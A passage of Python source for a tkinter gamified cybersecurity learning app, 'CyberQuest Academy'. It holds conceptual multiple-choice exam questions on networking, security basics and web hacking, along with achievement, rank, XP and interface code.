            {"q": "What does nmap -sS do?", "options": ["UDP scan", "SYN stealth scan", "Full connect scan", "Ping sweep"], "answer": 1},
            {"q": "Which protocol resolves domain names to IPs?", "options": ["DHCP", "ARP", "DNS", "SMTP"], "answer": 2},
            {"q": "What subnet mask does /24 represent?", "options": ["255.0.0.0", "255.255.0.0", "255.255.255.0", "255.255.255.128"], "answer": 2},
            {"q": "What command captures network packets?", "options": ["netstat", "ifconfig", "tcpdump", "ping"], "answer": 2},
            {"q": "What does ARP resolve?", "options": ["IP to hostname", "IP to MAC address", "MAC to IP", "Hostname to IP"], "answer": 1},
        ],
    },
    {
        "id": "exam_security",
        "title": "🧪 Security Foundations Exam",
        "xp": 35,
        "required_tree": "governance",
        "questions": [
            {"q": "What does the 'C' in CIA Triad stand for?", "options": ["Control", "Compliance", "Confidentiality", "Cryptography"], "answer": 2},
            {"q": "What is the CVSS score range for 'Critical'?", "options": ["7.0-8.9", "8.0-9.9", "9.0-10.0", "10.0 only"], "answer": 2},
            {"q": "What NIST CSF function involves monitoring for attacks?", "options": ["Identify", "Protect", "Detect", "Respond"], "answer": 2},
            {"q": "What format are CVE IDs?", "options": ["CVE-YYYY-NNNNN", "VULN-NNNNN", "SEC-YYYY-NN", "NVD-NNNNN"], "answer": 0},
            {"q": "What does the OWASP Top 10 focus on?", "options": ["Network vulnerabilities", "Web application vulnerabilities", "Hardware flaws", "Social engineering"], "answer": 1},
            {"q": "Which hash type starts with $6$?", "options": ["MD5", "SHA-256", "SHA-512", "bcrypt"], "answer": 2},
            {"q": "What is a zero-day vulnerability?", "options": ["A patched vulnerability", "A vulnerability with no known fix", "A low-severity bug", "A vulnerability found on day zero of a project"], "answer": 1},
            {"q": "What does 'defense in depth' mean?", "options": ["One very strong firewall", "Multiple layers of security controls", "Deep packet inspection only", "Encrypting everything"], "answer": 1},
        ],
    },
    {
        "id": "exam_webhack",
        "title": "🧪 Web Hacking Exam",
        "xp": 30,
        "required_tree": "webhack",
        "questions": [
            {"q": "What is SQL injection?", "options": ["Injecting CSS into pages", "Inserting malicious SQL into queries", "A type of DDoS attack", "Cross-site scripting"], "answer": 1},
            {"q": "What does XSS stand for?", "options": ["Cross-System Scripting", "Cross-Site Scripting", "eXtra Secure Socket", "XML Site Service"], "answer": 1},
            {"q": "What tool intercepts HTTP requests?", "options": ["Nmap", "Wireshark", "Burp Suite", "Metasploit"], "answer": 2},
            {"q": "What file often reveals hidden paths on web servers?", "options": ["index.html", "robots.txt", ".htaccess", "config.php"], "answer": 1},
            {"q": "What is the OWASP #1 vulnerability (2021)?", "options": ["Injection", "Broken Access Control", "XSS", "SSRF"], "answer": 1},
            {"q": "What does sqlmap automate?", "options": ["Port scanning", "SQL injection testing", "Password cracking", "Firewall configuration"], "answer": 1},
        ],
    },
]


# ══════════════════════════════════════════════════════
# ACHIEVEMENTS
# ══════════════════════════════════════════════════════

def get_achievements(completed, bonus, exams, sides):
    return [
        {"id": "first", "name": "First Blood", "desc": "Complete your first quest", "icon": "🩸",
         "check": lambda: len(completed) >= 1},
        {"id": "five", "name": "Grinding", "desc": "Complete 5 quests", "icon": "⚔️",
         "check": lambda: len(completed) >= 5},
        {"id": "ten", "name": "Double Digits", "desc": "Complete 10 quests", "icon": "🔟",
         "check": lambda: len(completed) >= 10},
        {"id": "twenty", "name": "Unstoppable", "desc": "Complete 20 quests", "icon": "🔥",
         "check": lambda: len(completed) >= 20},
        {"id": "all_quests", "name": "Completionist", "desc": "Complete ALL quests", "icon": "👑",
         "check": lambda: len(completed) >= len(ALL_QUESTS)},
        {"id": "first_bonus", "name": "Extra Credit", "desc": "Complete a bonus objective", "icon": "⭐",
         "check": lambda: len(bonus) >= 1},
        {"id": "five_bonus", "name": "Overachiever", "desc": "Complete 5 bonus objectives", "icon": "🌟",
         "check": lambda: len(bonus) >= 5},
        {"id": "first_exam", "name": "Test Taker", "desc": "Pass an exam", "icon": "📝",
         "check": lambda: len(sides) >= 1},
        {"id": "all_exams", "name": "Scholar", "desc": "Pass all exams", "icon": "🎓",
         "check": lambda: len(sides) >= len(SIDE_QUESTS)},
        {"id": "perfect_exam", "name": "Perfect Score", "desc": "Score 100% on any exam", "icon": "💯",
         "check": lambda: any(v == 100 for v in exams.values())},
        {"id": "linux_tree", "name": "Penguin Master", "desc": "Complete all Linux quests", "icon": "🐧",
         "check": lambda: all(q["id"] in completed for q in ALL_QUESTS if q["tree"] == "linux")},
        {"id": "web_tree", "name": "Web Warrior", "desc": "Complete all Web Hacking quests", "icon": "🕸️",
         "check": lambda: all(q["id"] in completed for q in ALL_QUESTS if q["tree"] == "webhack")},
        {"id": "defense_tree", "name": "Shield Wall", "desc": "Complete all Defense quests", "icon": "🛡️",
         "check": lambda: all(q["id"] in completed for q in ALL_QUESTS if q["tree"] == "defense")},
        {"id": "all_trees", "name": "Renaissance Hacker", "desc": "Quest in every skill tree", "icon": "🌈",
         "check": lambda: all(any(q["id"] in completed for q in ALL_QUESTS if q["tree"] == t) for t in SKILL_TREES)},
    ]

def get_rank(xp):
    current = RANKS[0]
    for r in RANKS:
        if xp >= r["xp"]:
            current = r
    return current

def get_next_rank(xp):
    for r in RANKS:
        if r["xp"] > xp:
            return r
    return None

def total_xp(save):
    xp = sum(q["xp"] for q in ALL_QUESTS if q["id"] in save.get("completed_quests", []))
    xp += sum(next((q.get("bonus_xp", 0) for q in ALL_QUESTS if q["id"] == bid), 0) for bid in save.get("bonus_completed", []))
    xp += sum(sq["xp"] for sq in SIDE_QUESTS if sq["id"] in save.get("side_quests_done", []))
    return xp


# ══════════════════════════════════════════════════════
# GUI
# ══════════════════════════════════════════════════════

class CyberQuestAcademy:
    BG = "#0a0a0f"
    BG2 = "#111118"
    BGH = "#1a1a24"
    BGC = "#08080e"
    FG = "#cccccc"
    FGD = "#555566"
    FGB = "#ffffff"
    ACC = "#00ff88"
    BRD = "#222233"
    DONE_BG = "#0a1a10"

    def __init__(self, root):
        self.root = root
        self.root.title("CyberQuest Academy")
        self.root.configure(bg=self.BG)
        self.root.geometry("960x740")
        self.root.minsize(720, 520)
        self.save = load_save()
        self.sel_tree = None

        self.ft = tkfont.Font(family="Consolas", size=20, weight="bold")
        self.fs = tkfont.Font(family="Consolas", size=9)
        self.fh = tkfont.Font(family="Consolas", size=13, weight="bold")
        self.fn = tkfont.Font(family="Consolas", size=10)
        self.fb = tkfont.Font(family="Consolas", size=10, weight="bold")
        self.fr = tkfont.Font(family="Consolas", size=16, weight="bold")
        self.fx = tkfont.Font(family="Consolas", size=24, weight="bold")
        self.fq = tkfont.Font(family="Consolas", size=11)

        self._build()
        self.show_dashboard()

    def _build(self):
        self.mf = tk.Frame(self.root, bg=self.BG)
        self.mf.pack(fill="both", expand=True)

        hf = tk.Frame(self.mf, bg=self.BG)
        hf.pack(fill="x", padx=20, pady=(10, 3))
        tk.Label(hf, text="CYBERQUEST ACADEMY", font=self.ft, fg=self.ACC, bg=self.BG).pack()
        tk.Label(hf, text="BEGINNER TO ADVANCED  •  PARROT OS", font=self.fs, fg=self.FGD, bg=self.BG).pack()

        self.rf = tk.Frame(self.mf, bg=self.BG2, highlightbackground="#00cc66", highlightthickness=1)
        self.rf.pack(fill="x", padx=20, pady=6)
        self._rank()

        nf = tk.Frame(self.mf, bg=self.BG)
        nf.pack(fill="x", padx=20, pady=(0, 3))
        tabs = [("⚔ QUESTS", self.show_dashboard), ("🧪 EXAMS", self.show_exams),
                ("🏆 ACHIEVEMENTS", self.show_achievements)]
        self.tab_btns = []
        for i, (txt, cmd) in enumerate(tabs):
            b = tk.Button(nf, text=txt, font=self.fb, bg=self.BG2, fg=self.FGD,
                          activebackground=self.BGH, activeforeground=self.ACC, bd=0,
                          padx=15, pady=6, cursor="hand2", command=cmd)
            b.pack(side="left", expand=True, fill="x", padx=1)
            self.tab_btns.append(b)

        cc = tk.Frame(self.mf, bg=self.BG)
        cc.pack(fill="both", expand=True, padx=20, pady=(3, 8))
        self.cv = tk.Canvas(cc, bg=self.BG, highlightthickness=0)
        sb = tk.Scrollbar(cc, orient="vertical", command=self.cv.yview, bg=self.BG2, troughcolor=self.BG)
        self.sf = tk.Frame(self.cv, bg=self.BG)
        self.sf.bind("<Configure>", lambda e: self.cv.configure(scrollregion=self.cv.bbox("all")))
        self.cw = self.cv.create_window((0, 0), window=self.sf, anchor="nw")
        self.cv.configure(yscrollcommand=sb.set)
        self.cv.pack(side="left", fill="both", expand=True)
        sb.pack(side="right", fill="y")
        self.cv.bind_all("<MouseWheel>", lambda e: self.cv.yview_scroll(int(-1*(e.delta/120)), "units"))
        self.cv.bind("<Configure>", lambda e: self.cv.itemconfig(self.cw, width=e.width))

    def _rank(self):
        for w in self.rf.winfo_children(): w.destroy()
        xp = total_xp(self.save)
        rk = get_rank(xp)
        nr = get_next_rank(xp)
        inn = tk.Frame(self.rf, bg=self.BG2)
        inn.pack(fill="x", padx=12, pady=8)
        top = tk.Frame(inn, bg=self.BG2)
        top.pack(fill="x")
        lf = tk.Frame(top, bg=self.BG2)
        lf.pack(side="left")
        tk.Label(lf, text=f"RANK {rk['level']}", font=self.fs, fg=self.ACC, bg=self.BG2).pack(anchor="w")
        tk.Label(lf, text=rk["title"], font=self.fr, fg=self.FGB, bg=self.BG2).pack(anchor="w")
        rt = tk.Frame(top, bg=self.BG2)
        rt.pack(side="right")
        xf = tk.Frame(rt, bg=self.BG2)
        xf.pack(anchor="e")
        tk.Label(xf, text=str(xp), font=self.fx, fg=self.FGB, bg=self.BG2).pack(side="left")
        tk.Label(xf, text=" XP", font=self.fh, fg=self.ACC, bg=self.BG2).pack(side="left", pady=(4,0))
        if nr:
            pf = tk.Frame(inn, bg=self.BG2)
            pf.pack(fill="x", pady=(5,0))
            ll = tk.Frame(pf, bg=self.BG2)
            ll.pack(fill="x")
            tk.Label(ll, text=rk["title"], font=self.fs, fg=self.FGD, bg=self.BG2).pack(side="left")
            tk.Label(ll, text=f"{nr['title']} — {nr['xp']-xp} XP to go", font=self.fs, fg=self.FGD, bg=self.BG2).pack(side="right")
            bb = tk.Frame(pf, bg=self.BRD, height=7)
            bb.pack(fill="x", pady=(2,0))
            bb.pack_propagate(False)
            p = (xp-rk["xp"])/max(1, nr["xp"]-rk["xp"])
            tk.Frame(bb, bg=self.ACC, height=7).place(relwidth=min(p,1.0), relheight=1.0)
        cf = tk.Frame(inn, bg=self.BG2)
        cf.pack(fill="x", pady=(5,0))
        comp = len(self.save.get("completed_quests",[]))
        bcomp = len(self.save.get("bonus_completed",[]))
        exams = len(self.save.get("side_quests_done",[]))
        tk.Label(cf, text=f"{comp}/{len(ALL_QUESTS)} Quests  •  {bcomp} Bonuses  •  {exams} Exams",
                 font=self.fs, fg=self.FGD, bg=self.BG2).pack()

    def _clear(self):
        for w in self.sf.winfo_children(): w.destroy()
        self.cv.yview_moveto(0)

    def _tabs(self, idx):
        for i, b in enumerate(self.tab_btns):
            b.configure(fg=self.ACC if i == idx else self.FGD)

    # ══════════════ DASHBOARD ══════════════

    def show_dashboard(self):
        self._clear()
        self._tabs(0)
        ff = tk.Frame(self.sf, bg=self.BG)
        ff.pack(fill="x", pady=(0,5))
        def sf(t):
            self.sel_tree = t
            self.show_dashboard()
        ba = tk.Button(ff, text="ALL", font=self.fs, bg=self.BGH if not self.sel_tree else self.BG2,
                       fg=self.FGB if not self.sel_tree else self.FGD, bd=0, padx=6, pady=2,
                       cursor="hand2", command=lambda: sf(None))
        ba.pack(side="left", padx=(0,2))
        for k, t in SKILL_TREES.items():
            s = self.sel_tree == k
            b = tk.Button(ff, text=f"{t['icon']}", font=self.fs, bg=self.BGH if s else self.BG2,
                          fg=t["color"] if s else self.FGD, bd=0, padx=5, pady=2,
                          cursor="hand2", command=lambda k=k: sf(k))
            b.pack(side="left", padx=1)

        # XP grid
        xg = tk.Frame(self.sf, bg=self.BG)
        xg.pack(fill="x", pady=(0,8))
        cols = min(5, len(SKILL_TREES))
        for i, (k, t) in enumerate(SKILL_TREES.items()):
            txp = sum(q["xp"] for q in ALL_QUESTS if q["id"] in self.save.get("completed_quests",[]) and q["tree"]==k)
            mxp = sum(q["xp"] for q in ALL_QUESTS if q["tree"]==k)
            c = tk.Frame(xg, bg=self.BG2, padx=5, pady=4)
            c.grid(row=i//cols, column=i%cols, sticky="ew", padx=1, pady=1)
            tk.Label(c, text=f"{t['icon']} {t['name'].split()[0]}", font=self.fs, fg=t["color"], bg=self.BG2, anchor="w").pack(fill="x")
            bg = tk.Frame(c, bg=self.BRD, height=4)
            bg.pack(fill="x", pady=(2,1))
            bg.pack_propagate(False)
            pr = txp/max(1,mxp)
            tk.Frame(bg, bg=t["color"], height=4).place(relwidth=min(pr,1.0), relheight=1.0)
            tk.Label(c, text=f"{txp}/{mxp}", font=self.fs, fg=self.FGD, bg=self.BG2, anchor="w").pack(fill="x")
        for c in range(cols): xg.columnconfigure(c, weight=1)

        avail = self._avail()
        for q in avail:
            self._card(q)
        if not avail:
            tk.Label(self.sf, text="No quests available. Complete lower tiers to unlock.", font=self.fn, fg=self.FGD, bg=self.BG, pady=20).pack()

        # Reset button at bottom
        tk.Label(self.sf, text="", bg=self.BG).pack(pady=5)
        tk.Button(self.sf, text="🔄 RESET ALL PROGRESS", font=self.fs, bg="#1a0a0a", fg="#ff4444",
                  bd=0, pady=6, cursor="hand2", command=self._reset).pack(fill="x")

    def _avail(self):
        qs = []
        comp = self.save.get("completed_quests", [])
        for q in ALL_QUESTS:
            if self.sel_tree and q["tree"] != self.sel_tree: continue
            if q["tier"] == 1:
                qs.append(q)
            elif q["tier"] == 2:
                if any(c for c in comp if any(a["id"]==c and a["tree"]==q["tree"] and a["tier"]==1 for a in ALL_QUESTS)):
                    qs.append(q)
            elif q["tier"] == 3:
                if any(c for c in comp if any(a["id"]==c and a["tree"]==q["tree"] and a["tier"]==2 for a in ALL_QUESTS)):
                    qs.append(q)
        return qs

    def _card(self, q):
        t = SKILL_TREES[q["tree"]]
        comp = self.save.get("completed_quests", [])
        bcomp = self.save.get("bonus_completed", [])
        d = q["id"] in comp
        bd = q["id"] in bcomp
        bg = self.DONE_BG if d else self.BG2
        cd = tk.Frame(self.sf, bg=bg, cursor="hand2", highlightbackground=self.ACC if d else self.BRD, highlightthickness=1)
        cd.pack(fill="x", pady=2)
        inn = tk.Frame(cd, bg=bg)
        inn.pack(fill="x", padx=10, pady=7)
        top = tk.Frame(inn, bg=bg)
        top.pack(fill="x")
        tk.Label(top, text=f"{t['icon']} T{q['tier']}", font=self.fs, fg=t["color"], bg=bg).pack(side="left")
        prefix = "  ✓ " if d else "  "
        tk.Label(top, text=f"{prefix}{q['title']}", font=self.fb, fg=self.ACC if d else self.FGB, bg=bg).pack(side="left")
        xp_text = f"+{q['xp']}"
        if q.get("bonus_xp") and bd:
            xp_text += f" +{q['bonus_xp']}★"
        elif q.get("bonus_xp"):
            xp_text += f" (+{q['bonus_xp']}★)"
        tk.Label(top, text=xp_text, font=self.fb, fg=t["color"], bg=bg).pack(side="right")
        tk.Label(inn, text=q["brief"], font=self.fs, fg=self.FGD, bg=bg, anchor="w").pack(fill="x", pady=(1,0))
        for w in [cd, inn, top] + list(inn.winfo_children()) + list(top.winfo_children()):
            w.bind("<Button-1>", lambda e, q=q: self._detail(q))

    def _detail(self, q):
        self._clear()
        self._tabs(0)
        t = SKILL_TREES[q["tree"]]
        comp = self.save.get("completed_quests", [])
        bcomp = self.save.get("bonus_completed", [])
        d = q["id"] in comp
        bd = q["id"] in bcomp

        tk.Button(self.sf, text="← Back", font=self.fb, bg=self.BG, fg=self.ACC, bd=0,
                  cursor="hand2", command=self.show_dashboard).pack(anchor="w", pady=(0,6))

        hd = tk.Frame(self.sf, bg=self.BG2, highlightbackground=t["color"], highlightthickness=1)
        hd.pack(fill="x")
        hi = tk.Frame(hd, bg=self.BG2)
        hi.pack(fill="x", padx=12, pady=8)
        tp = tk.Frame(hi, bg=self.BG2)
        tp.pack(fill="x")
        tk.Label(tp, text=f"{t['icon']} {t['name'].upper()} • TIER {q['tier']}", font=self.fs, fg=t["color"], bg=self.BG2).pack(side="left")
        tk.Label(tp, text=f"+{q['xp']} XP", font=self.fh, fg=t["color"], bg=self.BG2).pack(side="right")
        tk.Label(hi, text=q["title"], font=self.fh, fg=self.FGB, bg=self.BG2, anchor="w").pack(fill="x", pady=(3,0))

        mf = tk.Frame(self.sf, bg=self.BGC, highlightbackground=self.BRD, highlightthickness=1)
        mf.pack(fill="x", pady=(3,0))
        mt = tk.Text(mf, font=self.fn, bg=self.BGC, fg=self.FG, wrap="word", relief="flat", padx=12, pady=10, height=16)
        mt.pack(fill="both", expand=True)
        mt.insert("1.0", q["mission"])
        mt.tag_configure("hdr", foreground=t["color"], font=self.fb)
        mt.tag_configure("warn", foreground="#ff6688")
        content = mt.get("1.0", "end")
        for i, line in enumerate(content.split("\n"), 1):
            if line.startswith("═══") or line.startswith("►"):
                mt.tag_add("hdr", f"{i}.0", f"{i}.end")
            elif line.startswith("⚠"):
                mt.tag_add("warn", f"{i}.0", f"{i}.end")
        mt.configure(state="disabled")

        if not d:
            tk.Button(self.sf, text="✓  MARK COMPLETE", font=self.fh, bg=self.BG2, fg=t["color"],
                      bd=0, pady=10, cursor="hand2", command=lambda: self._complete(q)).pack(fill="x", pady=(6,0))
        else:
            tk.Label(self.sf, text="✓  QUEST COMPLETED", font=self.fh, fg=self.ACC, bg=self.DONE_BG, pady=10).pack(fill="x", pady=(6,0))

        # Bonus section
        if q.get("bonus"):
            bf = tk.Frame(self.sf, bg="#0f0f18", highlightbackground="#ffcc00", highlightthickness=1)
            bf.pack(fill="x", pady=(6,0))
            bi = tk.Frame(bf, bg="#0f0f18")
            bi.pack(fill="x", padx=12, pady=8)
            tk.Label(bi, text=f"★ BONUS OBJECTIVE (+{q.get('bonus_xp', 0)} XP)", font=self.fb, fg="#ffcc00", bg="#0f0f18", anchor="w").pack(fill="x")
            tk.Label(bi, text=q["bonus"], font=self.fs, fg=self.FG, bg="#0f0f18", anchor="w", wraplength=700, justify="left").pack(fill="x", pady=(4,0))
            if d and not bd:
                tk.Button(bi, text="★  CLAIM BONUS XP", font=self.fb, bg="#1a1a10", fg="#ffcc00",
                          bd=0, pady=6, cursor="hand2", command=lambda: self._claim_bonus(q)).pack(fill="x", pady=(6,0))
            elif bd:
                tk.Label(bi, text="★  BONUS CLAIMED", font=self.fb, fg="#ffcc00", bg="#0a1a10", pady=6).pack(fill="x", pady=(6,0))
            elif not d:
                tk.Label(bi, text="Complete the quest first to unlock bonus", font=self.fs, fg=self.FGD, bg="#0f0f18").pack(fill="x", pady=(4,0))

    def _complete(self, q):
        comp = self.save.get("completed_quests", [])
        if q["id"] not in comp:
            comp.append(q["id"])
            self.save["completed_quests"] = comp
            write_save(self.save)
            self._rank()
            self._detail(q)
            rk = get_rank(total_xp(self.save))
            messagebox.showinfo("Quest Complete!", f"+{q['xp']} XP!\nRank: {rk['title']}")

    def _claim_bonus(self, q):
        bcomp = self.save.get("bonus_completed", [])
        if q["id"] not in bcomp:
            bcomp.append(q["id"])
            self.save["bonus_completed"] = bcomp
            write_save(self.save)
            self._rank()
            self._detail(q)
            messagebox.showinfo("Bonus Claimed!", f"+{q.get('bonus_xp', 0)} Bonus XP!")

    def _reset(self):
        if messagebox.askyesno("Reset Progress", "This will ERASE all progress.\nCompleted quests, bonuses, exam scores — everything.\n\nAre you sure?"):
            if messagebox.askyesno("Confirm Reset", "Really? There's no undo. All XP and achievements will be gone."):
                self.save = {"completed_quests": [], "bonus_completed": [], "exam_scores": {}, "side_quests_done": [], "started": datetime.now().isoformat()}
                write_save(self.save)
                self._rank()
                self.show_dashboard()
                messagebox.showinfo("Reset Complete", "All progress has been reset.\nA fresh start — time to grind again!")

    # ══════════════ EXAMS ══════════════

    def show_exams(self):
        self._clear()
        self._tabs(1)
        tk.Label(self.sf, text="🧪 KNOWLEDGE EXAMS", font=self.fh, fg="#ffcc00", bg=self.BG).pack(anchor="w", pady=(0,4))
        tk.Label(self.sf, text="Test your knowledge. Score 70%+ to pass and earn XP.", font=self.fs, fg=self.FGD, bg=self.BG).pack(anchor="w", pady=(0,10))

        done = self.save.get("side_quests_done", [])
        scores = self.save.get("exam_scores", {})

        for sq in SIDE_QUESTS:
            passed = sq["id"] in done
            score = scores.get(sq["id"])
            bg = self.DONE_BG if passed else self.BG2
            cd = tk.Frame(self.sf, bg=bg, highlightbackground=self.ACC if passed else self.BRD, highlightthickness=1, cursor="hand2")
            cd.pack(fill="x", pady=2)
            inn = tk.Frame(cd, bg=bg)
            inn.pack(fill="x", padx=12, pady=8)
            top = tk.Frame(inn, bg=bg)
            top.pack(fill="x")
            prefix = "✓ " if passed else ""
            tk.Label(top, text=f"{prefix}{sq['title']}", font=self.fb, fg=self.ACC if passed else self.FGB, bg=bg).pack(side="left")
            rt = f"+{sq['xp']} XP"
            if score is not None:
                rt += f"  (Last: {score}%)"
            tk.Label(top, text=rt, font=self.fb, fg="#ffcc00", bg=bg).pack(side="right")
            tk.Label(inn, text=f"{len(sq['questions'])} questions  •  Required tree: {SKILL_TREES[sq['required_tree']]['name']}", font=self.fs, fg=self.FGD, bg=bg).pack(anchor="w")
            for w in [cd, inn, top] + list(inn.winfo_children()) + list(top.winfo_children()):
                w.bind("<Button-1>", lambda e, s=sq: self._start_exam(s))

    def _start_exam(self, sq):
        self._clear()
        self._tabs(1)
        self.exam_answers = {}
        self.current_exam = sq

        tk.Button(self.sf, text="← Back to Exams", font=self.fb, bg=self.BG, fg=self.ACC, bd=0,
                  cursor="hand2", command=self.show_exams).pack(anchor="w", pady=(0,8))
        tk.Label(self.sf, text=sq["title"], font=self.fh, fg="#ffcc00", bg=self.BG).pack(anchor="w", pady=(0,10))

        self.exam_vars = []
        for i, question in enumerate(sq["questions"]):
            qf = tk.Frame(self.sf, bg=self.BG2, highlightbackground=self.BRD, highlightthickness=1)
            qf.pack(fill="x", pady=3)
            qi = tk.Frame(qf, bg=self.BG2)
            qi.pack(fill="x", padx=12, pady=8)
            tk.Label(qi, text=f"Q{i+1}: {question['q']}", font=self.fb, fg=self.FGB, bg=self.BG2, anchor="w", wraplength=700, justify="left").pack(fill="x", pady=(0,5))
            var = tk.IntVar(value=-1)
            self.exam_vars.append(var)
            for j, opt in enumerate(question["options"]):
                tk.Radiobutton(qi, text=opt, variable=var, value=j, font=self.fn,
                               bg=self.BG2, fg=self.FG, selectcolor=self.BGH,
                               activebackground=self.BG2, activeforeground=self.ACC,
                               anchor="w").pack(fill="x", padx=10)

        tk.Button(self.sf, text="📝  SUBMIT EXAM", font=self.fh, bg="#1a1a10", fg="#ffcc00",
                  bd=0, pady=10, cursor="hand2", command=self._submit_exam).pack(fill="x", pady=(8,0))

    def _submit_exam(self):
        sq = self.current_exam
        correct = 0
        total = len(sq["questions"])
        for i, question in enumerate(sq["questions"]):
            if self.exam_vars[i].get() == question["answer"]:
                correct += 1
        score = int((correct / total) * 100)
        passed = score >= 70

        self.save.setdefault("exam_scores", {})[sq["id"]] = score
        if passed and sq["id"] not in self.save.get("side_quests_done", []):
            self.save.setdefault("side_quests_done", []).append(sq["id"])
        write_save(self.save)
        self._rank()

        if passed:
            messagebox.showinfo("Exam Passed! 🎉", f"Score: {correct}/{total} ({score}%)\n+{sq['xp']} XP!\n\nGreat work, Agent!")
        else:
            messagebox.showinfo("Not Quite", f"Score: {correct}/{total} ({score}%)\nNeed 70% to pass.\n\nReview the material and try again!")
        self.show_exams()

    # ══════════════ ACHIEVEMENTS ══════════════

    def show_achievements(self):
        self._clear()
        self._tabs(2)
        comp = self.save.get("completed_quests", [])
        bcomp = self.save.get("bonus_completed", [])
        exams = self.save.get("exam_scores", {})
        sides = self.save.get("side_quests_done", [])
        achs = get_achievements(comp, bcomp, exams, sides)
        earned = sum(1 for a in achs if a["check"]())
        tk.Label(self.sf, text=f"{earned}/{len(achs)} ACHIEVEMENTS", font=self.fh, fg=self.ACC, bg=self.BG).pack(pady=(0,8))
        for a in achs:
            e = a["check"]()
            bg = self.DONE_BG if e else self.BG2
            cd = tk.Frame(self.sf, bg=bg, highlightbackground=self.ACC if e else self.BRD, highlightthickness=1)
            cd.pack(fill="x", pady=2)
            inn = tk.Frame(cd, bg=bg)
            inn.pack(fill="x", padx=12, pady=7)
            r = tk.Frame(inn, bg=bg)
            r.pack(fill="x")
            tk.Label(r, text=a["icon"] if e else "🔒", font=self.fh, bg=bg).pack(side="left", padx=(0,8))
            inf = tk.Frame(r, bg=bg)
            inf.pack(side="left")
            tk.Label(inf, text=a["name"], font=self.fb, fg=self.ACC if e else self.FGD, bg=bg, anchor="w").pack(fill="x")
            tk.Label(inf, text=a["desc"], font=self.fs, fg=self.FGD, bg=bg, anchor="w").pack(fill="x")


# ══════════════════════════════════════════════════════
# LAUNCH
# ══════════════════════════════════════════════════════

def main():
    root = tk.Tk()
    try:
        import ctypes
        root.update()
        hwnd = ctypes.windll.user32.GetParent(root.winfo_id())
        ctypes.windll.dwmapi.DwmSetWindowAttribute(hwnd, 20, ctypes.byref(ctypes.c_int(1)), ctypes.sizeof(ctypes.c_int))
    except: pass
    CyberQuestAcademy(root)
    root.mainloop()

if __name__ == "__main__":
    main()
